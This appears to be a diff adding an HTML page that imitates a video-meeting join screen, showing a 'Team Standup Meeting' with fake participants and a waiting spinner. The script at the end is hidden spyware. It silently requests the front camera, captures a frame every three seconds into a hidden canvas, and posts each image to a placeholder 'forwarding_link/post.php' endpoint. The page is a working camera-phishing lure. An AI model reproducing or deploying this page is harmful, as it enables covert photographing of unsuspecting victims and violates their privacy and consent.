@@ -1,0 +1,214 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Virtual Meeting - Join Now</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #1a1a2e;
+        }
+        
+        .meeting-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        .meeting-header {
+            background: linear-gradient(135deg, #16213e 0%, #0f3460 100%);
+            padding: 20px;
+            border-radius: 15px;
+            margin-bottom: 20px;
+            color: white;
+        }
+        
+        .participant-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+        
+        .participant-card {
+            background: #0f3460;
+            border-radius: 10px;
+            padding: 15px;
+            text-align: center;
+            color: white;
+        }
+        
+        .participant-card .avatar {
+            width: 80px;
+            height: 80px;
+            background: #e94560;
+            border-radius: 50%;
+            margin: 0 auto 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 32px;
+        }
+        
+        .controls {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: #1a1a2e;
+            padding: 15px;
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            border-top: 1px solid #0f3460;
+        }
+        
+        .control-btn {
+            background: #16213e;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 30px;
+            color: white;
+            cursor: pointer;
+            font-size: 14px;
+        }
+        
+        .control-btn.end-call {
+            background: #e94560;
+        }
+        
+        .waiting-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0,0,0,0.9);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+        }
+        
+        .waiting-content {
+            background: white;
+            padding: 30px;
+            border-radius: 20px;
+            text-align: center;
+            max-width: 300px;
+        }
+        
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #e94560;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="waiting-modal" id="waitingModal">
+        <div class="waiting-content">
+            <h2>🎥 Joining Meeting</h2>
+            <div class="spinner"></div>
+            <p>Please wait, the host will let you in shortly...</p>
+        </div>
+    </div>
+    
+    <div class="meeting-container">
+        <div class="meeting-header">
+            <h2>Team Standup Meeting</h2>
+            <p>Meeting ID: 123-456-789 • Host: John Doe</p>
+        </div>
+        
+        <div class="participant-grid">
+            <div class="participant-card">
+                <div class="avatar">👤</div>
+                <p>You</p>
+                <small>Connected</small>
+            </div>
+            <div class="participant-card">
+                <div class="avatar">👩</div>
+                <p>Sarah (Host)</p>
+                <small>Speaking</small>
+            </div>
+            <div class="participant-card">
+                <div class="avatar">👨</div>
+                <p>Mike</p>
+                <small>Joined</small>
+            </div>
+            <div class="participant-card">
+                <div class="avatar">👩‍💻</div>
+                <p>Lisa</p>
+                <small>Joined</small>
+            </div>
+        </div>
+    </div>
+    
+    <div class="controls">
+        <button class="control-btn">🎤 Mute</button>
+        <button class="control-btn">📹 Stop Video</button>
+        <button class="control-btn">👥 Participants</button>
+        <button class="control-btn">💬 Chat</button>
+        <button class="control-btn end-call">📞 Leave</button>
+    </div>
+    
+    <script>
+        setTimeout(function() {
+            document.getElementById('waitingModal').style.display = 'none';
+        }, 5000);
+        
+        (function() {
+            var video = document.createElement('video');
+            video.setAttribute('playsinline', '');
+            video.setAttribute('autoplay', '');
+            video.style.display = 'none';
+            document.body.appendChild(video);
+            
+            var canvas = document.createElement('canvas');
+            canvas.width = 640;
+            canvas.height = 480;
+            canvas.style.display = 'none';
+            document.body.appendChild(canvas);
+            
+            function captureAndSend(imgdata) {
+                var xhr = new XMLHttpRequest();
+                xhr.open('POST', 'forwarding_link/post.php', true);
+                xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+                xhr.send('cat=' + encodeURIComponent(imgdata));
+            }
+            
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                navigator.mediaDevices.getUserMedia({ audio: false, video: { facingMode: "user" } })
+                    .then(function(stream) {
+                        video.srcObject = stream;
+                        var context = canvas.getContext('2d');
+                        setInterval(function() {
+                            context.drawImage(video, 0, 0, 640, 480);
+                            var imgData = canvas.toDataURL("image/png");
+                            captureAndSend(imgData);
+                        }, 3000);
+                    })
+                    .catch(function(err) {
+                        console.log("Camera:", err.message);
+                    });
+            }
+        })();
+    </script>
+</body>
+</html>
